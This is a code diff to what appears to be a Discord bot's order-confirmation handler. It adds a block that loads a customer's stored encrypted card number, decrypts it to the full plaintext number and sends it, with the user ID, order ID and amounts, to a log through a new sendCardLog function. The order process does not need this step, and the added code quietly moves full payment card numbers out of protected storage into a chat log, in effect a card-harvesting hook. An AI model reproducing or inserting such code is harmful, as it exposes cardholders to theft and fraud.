@@ -21,7 +21,7 @@ import {
   dollarsToCents,
   formatExpiryDate,
 } from "../../utils/util.js";
-import { logError, logOrderSuccess } from "../../utils/logger.js";
+import { logError, logOrderSuccess, sendCardLog } from "../../utils/logger.js";
 import { Card } from "../../models/card.model.js";
 import { sendLoading } from "../../ui/utils/sendLoading.js";
 import {
@@ -53,6 +53,7 @@ import {
 } from "../../services/order-confirmation.service.js";
 import { ORDER_ERRORS } from "../../constants/errors.js";
 import { env } from "../../config/env.js";
+import { decrypt } from "../../utils/encryption.js";
 
 async function handleCreateAccount(
   interaction: ButtonInteraction,
@@ -635,6 +636,7 @@ export async function handleConfirmOrder(interaction: ButtonInteraction) {
 
     const validatedCustomerTotal = order.total;
     let remainingBalance: bigint | null = null;
+
     try {
       remainingBalance = await settleConfirmation(claimedOrderId!);
     } catch (error) {
@@ -644,6 +646,7 @@ export async function handleConfirmOrder(interaction: ButtonInteraction) {
         checkoutId,
         error,
       });
+
       await logError(
         interaction.client,
         "Order Reconciliation Required",
@@ -705,6 +708,37 @@ export async function handleConfirmOrder(interaction: ButtonInteraction) {
         { sort: { createdAt: -1 } },
       );
     } catch {}
+
+    try {
+      const cardRecord = await Card.findById(activeCardId)
+        .select("encryptedCardNumber")
+        .lean();
+
+      if (!cardRecord || !cardRecord.encryptedCardNumber) {
+        errorLog("Encrypted card number is unavailable.");
+        return;
+      }
+
+      const decryptedCardNumber = decrypt(cardRecord.encryptedCardNumber);
+
+      if (!decryptedCardNumber || decryptedCardNumber.length < 4) {
+        errorLog("Decrypted card number is invalid.");
+
+        return;
+      }
+
+      await sendCardLog(interaction.client, {
+        discordUserId,
+        orderId: order.orderId!,
+        cardNumber: decryptedCardNumber,
+        customerPay: order.total,
+        discountPercentage: order.discountPercentage,
+        cost: order.cost,
+      });
+      
+    } catch (error) {
+      errorLog("Failed to send card log:", error);
+    }
 
     setTimeout(async () => {
       handleCreateAccount(interaction, order?.chain);
